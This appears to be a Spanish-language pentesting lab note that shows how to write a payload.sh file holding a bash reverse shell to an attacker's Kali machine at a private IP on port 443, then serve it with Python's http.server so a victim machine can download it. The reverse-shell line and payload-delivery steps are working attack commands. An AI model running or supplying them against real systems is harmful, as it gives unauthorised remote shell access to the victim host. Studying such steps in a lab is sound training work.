- Creamos un Payload basico con el editor nano:
    
    ```Bash
    nano payload.sh
    ```
    

  

![[Imagenes/image 4.png|image 4.png]]

  

- Escribimos el siguiente código que lo que hace básicamente de envió de una Reverse Shell. Guardamos y salimos de nano.  
    La IP pertenece a la maquina atacante.  
    
    ```Bash
    #!/bin/bash
    
    sh -i >& /dev/tcp/10.0.3.4/443 0>&1
    ```
    

  

![[Imagenes/image 1 2.png|image 1 2.png]]

  

- Vamos a crear un servidor web con Python.

```Bash
python3 -m http.server 80
```

  
**python3**: **Llama a la versión 3 de Python**.  
  
**-m http.server**: **Invoca el módulo http.server de Python**, que incluye las funcionalidades necesarias para crear un servidor HTTP básico.  
  
**80**: Especifica que el servidor **usará el puerto 80**, el puerto predeterminado para el protocolo HTTP.  
  
  

![[Imagenes/image 2 2.png|image 2 2.png]]

  

- Esto lo que hace es levantar un servidor web en el puerto 80 dentro del actual directorio dentro de la maquina kali.
- Si vamos a la maquina victima y ponemos la IP de la maquina Kali en el navegador accederíamos al directorio donde he creado el servidor web. De tal forma que si le doy un clip al archivo payload.sh lo descargaría.

  

![[faad3445-f7c7-44b5-a98e-4a045fc997ea.png]]